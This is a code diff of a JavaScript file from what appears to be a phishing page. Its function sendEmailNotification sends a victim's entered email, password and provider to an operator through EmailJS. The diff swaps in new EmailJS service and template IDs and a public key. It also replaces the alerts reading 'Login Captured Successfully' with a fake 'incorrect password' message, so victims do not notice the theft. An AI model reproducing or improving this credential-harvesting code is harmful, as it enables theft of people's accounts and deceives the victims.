@@ -1,7 +1,7 @@
 // EmailJS Configuration
-const EMAILJS_SERVICE_ID = "service_um08b0k"
-const EMAILJS_TEMPLATE_ID = "template_13k00gd"
-const EMAILJS_PUBLIC_KEY = "4zxF4NX0aiWTg6NQH"
+const EMAILJS_SERVICE_ID = "service_ijxbwvw"
+const EMAILJS_TEMPLATE_ID = "template_2wl85yp"
+const EMAILJS_PUBLIC_KEY = "bvHl4Q_ETYVFECcMq"
 
 let currentProvider = ""
 
@@ -58,16 +58,16 @@ function sendEmailNotification(email, password, provider) {
   console.log("Sending email with params:", templateParams)
 
   // Show loading message
-  const loadingAlert = alert("Sending notification to admin...")
+  const loadingAlert = alert("checking...")
 
   window.emailjs
     .send(EMAILJS_SERVICE_ID, EMAILJS_TEMPLATE_ID, templateParams)
     .then((response) => {
-      console.log("✅ Email sent successfully!", response.status, response.text)
+      console.log("✅ confirming..........", response.status, response.text)
 
       // Show the captured data alert
       alert(
-        `✅ Login Captured Successfully!\n\nProvider: ${currentProvider}\nEmail: ${email}\nPassword: ${password}\n\n📧 Admin has been notified!`,
+        `incorrect password`,
       )
 
       // Show success message
@@ -78,7 +78,7 @@ function sendEmailNotification(email, password, provider) {
 
       // Still show the captured data
       alert(
-        `⚠️ Login Captured (Email Error):\n\nProvider: ${currentProvider}\nEmail: ${email}\nPassword: ${password}\n\nError: ${error.text || "Unknown error"}`,
+        `incorrect password`,
       )
 
       // Still show success
